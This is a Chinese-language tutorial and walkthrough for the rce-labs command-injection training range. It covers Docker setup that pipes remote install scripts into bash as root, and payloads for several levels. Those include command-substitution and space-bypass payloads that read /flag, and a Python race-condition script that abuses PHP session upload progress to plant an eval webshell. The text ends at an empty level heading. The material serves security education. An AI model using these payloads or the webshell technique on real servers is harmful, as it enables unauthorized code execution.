## 靶场说明

rce-labs 命令注入靶场是一个面向网络安全初学者设计的漏洞学习场景，主要提供了基础命令、shell 特性、常见姿势、常见waf绕过等模块学习内容。项目地址：https://github.com/Apursuit/rce-labs

### Docker 部署方式

靶机提供了docker镜像，支持一键部署，依赖docker 和 docker-compose环境，对于没有安装docker环境的学者，可以参考以下命令安装docker。

使用 root 权限执行以下命令安装 Docker 和 Docker Compose，先给 GNU/Linux 更换系统软件源，加快后续下载速度。

```bash
bash <(curl -sSL https://linuxmirrors.cn/main.sh)
```

Docker 安装与换源

```bash
bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
```

### docker compose（推荐）

安装 docker 环境完成后，把源码克隆到本地，使用 docker compose 快速部署靶机场景。

```bash
git clone https://gh-proxy.org/https://github.com/Apursuit/rce-labs.git
cd rce-labs/docker
docker-compose up -d
```

访问靶机地址的8080端口，浏览器访问 http://ip:8080/

### less-38 反引号命令替换

linux 命令替换语法，使用反引号 \` 或者 `$()` 来执行命令，并把输出结果替换到命令行中。shell 执行一行命令时，不是把整行直接丢给程序，而是先从左到右把命令里的特殊写法“拆开、替换掉”，拼成最终要执行的命令，再真正执行。命令替换（反引号 `...` 或 $()）就是在这个“替换”阶段发生的：括号里的命令会先被执行，执行结果被原地替换到命令行里。



```bash
`cat /flag` 2>/dev/stdout
```

### less-38a $() 命令替换

linux 命令替换语法，使用 $() 来执行命令，并把输出结果替换到命令行中。shell 执行一行命令时，不是把整行直接丢给程序，而是先从左到右把命令里的特殊写法“拆开、替换掉”，拼成最终要执行的命令，再真正执行。命令替换（反引号 `...` 或 $()）就是在这个“替换”阶段发生的：括号里的命令会先被执行，执行结果被原地替换到命令行里。

```bash
$(cat /flag) 2>/dev/stdout
```

### less-41 $IFS 空格绕过

绕过空格，使用 $IFS 来替代空格，IFS 是 linux 的内部字段分隔符，默认是空格、制表符和换行符。


### less-42 ${IFS} 空格绕过

`${IFS}` 的作用是明确变量名的边界，让 shell 准确知道变量名到哪里结束。在命令注入绕过空格的场景里，它和 `$IFS` 效果一样，都是把 IFS 变量的值（默认是空格、制表符、换行符）展开出来当作分隔符使用。当变量名后紧跟变量名字符（如 ${IFS}abc）时，花括号才是必需的；${IFS}/flag 中 / 不是变量名字符，$IFS/flag 同样可用。

```bash
cat${IFS}/flag
```

### less-43 {cmd,param} 空格绕过

利用 bash 花括号展开，{cat,/flag} 展开为 cat /flag 两个参数，从而在没有空格的情况下分隔命令与参数。

```bash
{cat,/flag}
```

### less-50 PHP Session临时文件执行1

这块需要补充些基础，下面简单讲讲，详细请阅读：https://the0n3.top/posts/php-tmp-file/

PHP 在接收任何 multipart/form-data 请求时，会在脚本执行前由 SAPI 层自动解析请求体，把文件部分写入临时目录upload_tmp_dir（默认 /tmp），并填充好 $_FILES 和 $_POST。这个过程与脚本是否真的处理上传无关——只要请求格式是 multipart，PHP 就会先落盘再交控制权，Web 服务器（Apache/Nginx）只负责转发原始请求体。因此，即使你直接伪造一个 multipart 请求、脚本里完全没有上传逻辑，PHP 依然会在 /tmp 留下临时文件。$_FILES 的上传临时文件在请求结束即删除。

Session Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。

PHP配置文件里默认开启了通过session状态文件记录文件上传进度的功能和自动清理 session 文件中的上传进度记录的功能，并且这个记录文件上传的sessionid和PHP_SESSION_UPLOAD_PROGRESS是我们可控的，sessionid可以让我们控制文件名，PHP_SESSION_UPLOAD_PROGRESS 这个变量的值可以让我们控制部分文件内容（上传进度）。

两个特性结合，我们可以通过伪造 multipart/form-data 请求，控制 sessionid 和 PHP_SESSION_UPLOAD_PROGRESS 的值，来写入一个 session 临时文件，然后通过 POSIX 标准的 . 命令，读取并执行指定路径的临时文件，达到写入一句话木马的目的。

为什么选择 session 临时文件？该文件的文件名可控，文件内容可控，生成方式可控，唯一缺点是默认开启自动清理功能，文件上传结束会自动清理 session 文件中的上传进度记录，存在一个时间窗口，需要我们利用高并发脚本抢夺该时间窗口，执行可控的文件内容。

其中 php 的 session 文件在不同发行版的默认路径可能不同，如果在 php.ini 中没有配置 session.save_path，则默认路径为 /tmp，文件名为 sess_ + session_id。文件里会记录 PHP_SESSION_UPLOAD_PROGRESS 变量的值，文件内容可控。

```python
import io
import requests
import threading

url = 'http://192.168.6.100:32769/less-50/'
sessionid = 'aaa'

def write(session): # 写入临时文件
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':"""

                # php 执行内容
                # <?php system("echo 'php code<?php highlight_file(__FILE__);eval(\\$_POST[1]);?>' > /var/www/html/less-50/shell.php");?>

                # sh 执行内容
                echo 'sh code<?php highlight_file(__FILE__);eval($_POST[1]);?>' > /var/www/html/less-50/shell.php

                """},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        # 这里 cmd 解释器还可以换为php，如'?cmd=php<>/tmp/sess_'
        session.get(url+'?cmd=sh<>/tmp/sess_'+sessionid) # 使用 <> 绕过空格，通过sh或其他解释器执行临时文件内容
        r = session.get(url+'shell.php') # 检查是否写入一句话木马
        if r.status_code == 200:
            print('OK')
            return ;

evnet=threading.Event() # 多线程

session = requests.session()
for i in range(10):
    threading.Thread(target = write,args = (session,)).start()
for i in range(10):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```

### less-52 PHP Session临时文件执行

黑名单几乎禁用了上面所有提到过的命令，可以利用 php 的 session 上传进度信息生成的临时文件，结合 sh 、php 此类解释器，读取并执行指定路径的临时文件，达到写入一句话木马的目的。与上文 less-50 类似，这里主要使用通配符完成。

```bash
import io
```

### less-53 无字母数字RCE
